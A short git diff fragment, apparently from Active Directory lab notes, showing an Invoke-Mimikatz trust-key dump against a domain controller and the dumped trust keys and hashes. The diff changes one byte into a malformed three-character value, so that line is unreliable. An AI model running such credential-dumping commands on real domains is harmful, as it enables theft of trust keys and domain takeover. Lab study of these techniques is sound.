@@ -16,7 +16,7 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc
 
 Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
  [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL
-    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad e4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
+    * 1/23/2022 11:37:21 PM - CLEAR   - 28 62 25 ae 13 68 18 ad ef4 4f b2 7c 22 64 22 9d 8f f7 ac c3 0e 24 2b 09 00 50 4b 35
         * aes256_hmac       ff3616ac06c24395fb76b08d7cc7f0038cd257869b43eb13ebaf9a3061929a1e
         * aes128_hmac       a2ab6e6daf483e61ed6ffa50856ad277
         * rc4_hmac_nt       13d28ca9e5863231c89eda2b2b1756d7
